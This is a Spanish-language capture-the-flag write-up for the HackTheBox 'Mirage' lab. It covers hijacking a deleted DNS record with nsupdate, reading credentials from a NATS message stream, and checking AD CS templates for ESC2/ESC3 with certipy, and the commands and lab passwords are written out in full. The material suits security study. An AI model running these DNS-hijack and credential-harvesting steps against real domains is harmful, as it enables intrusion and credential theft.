Authenticación_Hardening_Report#

Este pdf viene por parte del equipo de seguridad de AD, en el que indican que la autenticación NTLM esta siendo desactivada de todos los dispositivos y aplicaciones que usan esta autenticación para sustituirla por Kerberos.

Report_Missing_DNS_Record_nats_svc#

Este siguiente reporte, proviene del equipo de infraestructura de la red. Y en el se comenta que habían tenido problemas con el hostname nats-svc.mirage.htb ya que había sido eliminado automáticamente porque el registro no había sido actualizado en un plazo de 14 días. Hasta este momento nosotros no sabíamos sobre la existencia de esta dirección, y se comenta que este hostname es crítico para el sistema interno de comunicación con el sistema de mensajería del sistema NATS alojado en el dominio Mirage.

  • Descubrimos nueva dirección hostname que ha sido eliminada : nats-svc.mirage.htb.
  • Se usa como sistema de mensajería interna NATS.

También al final del pdf, encontramos que puntualizan un posible vector de ataque:

En entornos de desarrollo, los nombres de servicio fijos, como nats-svc.mirage.htb, a menudo se codifican de forma rígida en las aplicaciones.

Si falta el registro DNS, algunas aplicaciones pueden seguir intentando conectarse a ese nombre. Este comportamiento podría ser objeto de abuso por parte de los atacantes si se secuestran los registros DNS.

Entonces, para ponernos en contexto tenemos los siguientes puntos clave:

  • Registro nats-svc ha sido removido del servidor.

  • Posiblemente quede algún servició que aún siga resolviendo a hostname para autenticarse.

Dynamic DNS Updates#

Windows Server permite (por diseño) que ciertos hosts hagan “Dynamic DNS Updates” para registrar registros tipo A sin credenciales si se cumplen ciertas condiciones.

Muchos controladores de dominio permiten por defecto que:

  • Cualquier máquina unida al dominio pueda registrar un nombre nuevo (en el caso de que no exista).

  • A veces, incluso hosts que no están unidos al dominio pueden registrar nombres si no están en uso, gracias a cómo está configurado el servidor DNS (con actualizaciones dinámicas habilitadas).

Entonces ahora que ya tenemos el vector de ataque identificado, vamos a usar la herramienta nsupdate para enviar una petición DNS dinámica al DC y crear un registro A.

Creamos un archivo llamado update.txt en que vamos a añadir las instrucciones que le lanzaremos al DC:

❯ cat update.txt

server 10.10.11.78
update add nats-svc.mirage.htb. 3600 A 10.10.14.51
send

Luego lanzamos el comando con el archivo .txt, en la salida haciendo uso de -d vemos que se envia la actualización a la ip 10.10.11.78 y que nos devuelve la query con un UPDATE:1.

nsupdate -v -d update.txt

Al parecer el comando ha funcionado pero lo comprobamos con dig y con nslookup.

dig @10.10.11.78 nats-svc.mirage.htb A +short

Nats Enumeration#

Nats es un sistema de mensajería de código abierto.

Primero añadimos un contexto con la url del servidor y las credenciales.

nats context add nats-serv --server nats://dc01.mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' --selectV

Veo un stream llamado auth_logs

nats stream ls

Con lo cual voy a hacer un nuevo consumer en el stream auth_logs para tratar de leer los mensajes.

nats consumer add auth_logs myreader --deliver all --ack explicit

nats consumer next auth_logs myreader --count=5

Vemos que tenemos al parecer unas credenciales de david.jjackson:“pN8kQmn6b86!1234@”. Con lo cual las vamos a comprobar con nxc.

sudo ntpdate -u 10.10.11.78

Probando diferentes cosas, me pongo a buscar posibles configuraciones inseguras en AD CS con certipy find.

[ESC2: Any Purpose Certificate Template](certipy find -k -dc-host DC01.mirage.htb -stdout)

Las explotaciones ESC2 incluyen dos componentes clave de los cuales fijarse para comprobar que la plantilla sea realmente vulnerable:

  • Obtener un certificado para AnyPurpose: La primera plantilla contiene la flag “AnyPurpose” definida.
  • Una plantilla que permita Enrollment Rights: Una segunda plantilla de certificados que permita a usuarios poco privilegiados como (Domain Users) permisos que permita el enrolamiento de agentes.

Si miramos como identificar con certipy que la plantilla es vulnerable, nos tenemos que fijar en que la flag AnyPurpose sea igual a True.

En nuestro caso, si nos fijamos vemos que tenemos la flag AnyPurpose: False. Y no tenemos ningún indicador de plantillas miss configuradas como: [!] Vulnerabilities ESC2 : Template can be used for any purpose. o [!] Vulnerabilities ESC3 : Template has Certificate Request Agent EKU set.

Si miramos que componentes necesitamos para la explotación de ESC3, vemos lo siguiente:

  • Necesitamos una plantilla de certificados que permita el enrolamiento de agentes. Pero si miramos ambas plantillas vulnerables, vemos que ambas tienen el Enrollment Agent: False.
